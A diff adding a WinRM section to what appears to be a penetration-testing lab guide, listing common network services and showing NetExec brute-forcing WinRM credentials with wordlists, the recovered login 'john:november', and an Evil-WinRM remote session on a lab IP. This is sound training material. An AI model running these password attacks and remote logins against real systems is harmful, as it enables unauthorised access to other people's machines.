@@ -537,3 +537,68 @@ ls -la
 ---
 
 ### Network Services
+
+Apart from web applications, we will come across many different services, including:
+
+- `FTP`
+- `SSH`
+- `Telnet`
+- `RDP`
+- `WinRM`
+- `SMB`
+- `NFS`
+- `MySQL/MSSQL`
+- `IMAP/POP3`
+- `SMTP`
+- `LDAP`
+
+Many of these services may be misconfigured or configured with default settings.
+
+**WinRM**
+
+**Windows Remote Management (WinRM)** is the Microsoft implementation of the **Web Services Management Protocol (WS-Management)**. WinRM is an XML based network protocol using **Simple Object Access Protocol (SOAP)** for remote management of Windows systems. 
+
+In newer versions of Windows (10/11), WinRM is not enabled by default, and must be manually activated and configured. By default, WinRM uses ports `5985` (HTTP) and `5986` (HTTPS). 
+
+`NetExec` is a handy tool that can be used for password attacks against WinRM, as well as other protocols, such as SMB, LDAP and MSSQL. 
+
+Install `NetExec`:
+
+```bash
+sudo apt install netexec -y
+```
+
+The following example is a username and password attack against a WinRM endpoint:
+
+```bash
+netexec winrm 10.129.202.136 -u user-wordlist -p password-wordlist
+```
+
+Recoverd credentials:
+
+```
+john:november
+```
+
+![Filtered output](./.images/netexec-brute-force.PNG)
+
+Once valid credentials have been obtained, we can authenticae to the WinRM service with a tool called `Evil-WinRM`.
+
+Install `Evil-WinRM`:
+
+```bash
+sudo gem install evil-winrm
+```
+
+Authenticate:
+
+```bash
+evil-winrm -i 10.129.202.136 -u john -p november
+```
+
+The login is successful, and a terminal session is initialized.
+
+![Filtered output](./.images/evil-winrm.PNG)
+
+**SSH**
+
